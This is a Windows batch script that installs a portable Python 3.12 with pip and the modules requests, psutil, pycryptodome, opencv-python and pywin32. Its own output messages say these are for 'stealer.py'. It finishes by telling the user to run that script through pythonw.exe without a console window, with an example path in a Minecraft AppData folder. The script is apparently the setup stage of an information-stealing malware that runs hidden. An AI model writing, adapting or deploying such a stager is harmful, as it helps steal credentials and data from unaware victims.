@echo off
setlocal EnableDelayedExpansion

set "PYTHON_DIR=%USERPROFILE%\Python312"
set "ZIP=%TEMP%\python-embed.zip"
set "URL=https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip"
set "PIP_SCRIPT=%TEMP%\get-pip.py"
set "PIP_URL=https://bootstrap.pypa.io/get-pip.py"

:: Clean existing Python directory to avoid conflicts
if exist "%PYTHON_DIR%" (
    echo Cleaning existing Python directory: %PYTHON_DIR%
    rmdir /s /q "%PYTHON_DIR%"
)

:: Download Python
echo Downloading Python from %URL% to %ZIP%
curl.exe -L -o "%ZIP%" "%URL%"
if not exist "%ZIP%" (
    echo Error: Python zip not downloaded.
    exit /b 1
)

:: Extract Python
echo Extracting %ZIP% to %PYTHON_DIR%
mkdir "%PYTHON_DIR%"
tar -xf "%ZIP%" -C "%PYTHON_DIR%"
if not exist "%PYTHON_DIR%\pythonw.exe" (
    echo Error: pythonw.exe not found in %PYTHON_DIR%. Contents:
    dir "%PYTHON_DIR%"
    exit /b 2
)

:: Enable site-packages in python312._pth
echo Enabling site-packages in python312._pth
echo import site>> "%PYTHON_DIR%\python312._pth"

:: Download get-pip.py
echo Downloading get-pip.py from %PIP_URL% to %PIP_SCRIPT%
curl.exe -L -o "%PIP_SCRIPT%" "%PIP_URL%"
if not exist "%PIP_SCRIPT%" (
    echo Error: get-pip.py not downloaded.
    exit /b 3
)

:: Install pip using python.exe (pythonw.exe suppresses output)
echo Installing pip...
"%PYTHON_DIR%\python.exe" "%PIP_SCRIPT%" --no-warn-script-location
if errorlevel 1 (
    echo Error: pip installation failed.
    exit /b 4
)

:: Verify pip installation
echo Verifying pip installation...
"%PYTHON_DIR%\python.exe" -m pip --version
if errorlevel 1 (
    echo Error: pip not installed correctly.
    exit /b 5
)

:: Install required modules
echo Installing modules for stealer.py (requests, psutil, pycryptodome, opencv-python, pywin32)...
"%PYTHON_DIR%\python.exe" -m pip install requests psutil pycryptodome opencv-python pywin32 --no-cache-dir
if errorlevel 1 (
    echo Error: Failed to install some modules. Listing installed packages:
    "%PYTHON_DIR%\python.exe" -m pip list
    exit /b 6
)

:: Verify pycryptodome installation
echo Verifying pycryptodome installation...
"%PYTHON_DIR%\python.exe" -c "import Cryptodome; print('pycryptodome is installed')"
if errorlevel 1 (
    echo Error: pycryptodome not installed correctly. Check network or permissions.
    exit /b 7
)

:: Update PATH for current session
echo Setting PATH for current session...
set "PATH=%PYTHON_DIR%;%PATH%"

:: Clean up
echo Cleaning up...
del "%ZIP%" >nul 2>&1
del "%PIP_SCRIPT%" >nul 2>&1

echo Portable Python installed in %PYTHON_DIR% with pip and modules.
echo To run stealer.py without console, use: "%PYTHON_DIR%\pythonw.exe" path_to_stealer.py
echo Example: "%PYTHON_DIR%\pythonw.exe" C:\Users\Home\AppData\Roaming\.minecraft\downloaded_1757955939.py

endlocal
exit /b 0